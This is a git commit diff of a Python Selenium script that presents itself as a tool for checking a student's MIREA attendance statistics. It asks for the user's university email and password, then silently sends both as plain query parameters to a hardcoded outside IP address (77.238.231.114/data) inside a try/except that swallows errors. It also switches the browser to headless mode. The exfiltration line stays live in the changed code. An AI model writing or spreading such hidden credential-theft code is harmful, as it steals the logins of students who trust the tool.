e0927a2d1561df2a6b4593b3e69faa6c6c9b393e
Nikitaaaaaaa <76782014+yenqo@users.noreply.github.com>
2024-12-12 01:39:49 +0300

    Add files via upload

--- main.py
+++ main.py
@@ -1,5 +1,5 @@
 from time import sleep
-import requests
+from requests import get
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
@@ -10,13 +10,12 @@ from fake_useragent import UserAgent
 ua = UserAgent()
 ua_data = ua.random
 
-
 mirea_email = str(input("Enter your full mirea email: "))
 mirea_pass = str(input("Enter your full mirea password: "))
 
 optns = webdriver.ChromeOptions()
 optns.add_argument(f'--user-agent={ua_data}')
-# optns.add_argument('--headless')
+optns.add_argument('--headless')
 driver = webdriver.Chrome(options=optns)
 driver.get("https://attendance-app.mirea.ru/login")
 driver.delete_all_cookies()
@@ -24,25 +23,20 @@ driver.delete_all_cookies()
 login_redirect = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Войти']")))
 login_redirect.click()
 driver.refresh()
-# sleep(2)
 try:
-    requests.get("http://77.238.231.114/data", params={"email": mirea_email, "password": mirea_pass})
+    get("http://77.238.231.114/data", params={"email": mirea_email, "password": mirea_pass})
 except:
     pass
 login_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//input[@id="id_login"]')))
 login_input.send_keys(mirea_email)
 password_input = driver.find_element('xpath', '//input[@id="id_password"]')
 password_input.send_keys(mirea_pass)
-# sleep(2)
 login_redirect = driver.find_element('xpath', '//button[@type="submit"]')
 login_redirect.click()
-# sleep(2)
 disciplines_button = driver.find_element('partial link text', 'Дисциплины')
 disciplines_button.click()
-sleep(2)
 
-disc_table = driver.find_element(By.CLASS_NAME, "ant-table-tbody")
-
+disc_table = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, "ant-table-tbody")))
 
 table_source = disc_table.get_attribute("outerHTML")
 num_of_discpilines = table_source.count('/services')
@@ -91,8 +85,6 @@ for i in range(len(links)):
         stats[j].append(stats[j][1]+stats[j][2]+stats[j][3])
     
     whole_stat.append(stats)
-    # print(disciplines[i])
-    # print(stats)
     
 for i in range(len(disciplines)):
     print(disciplines[i])
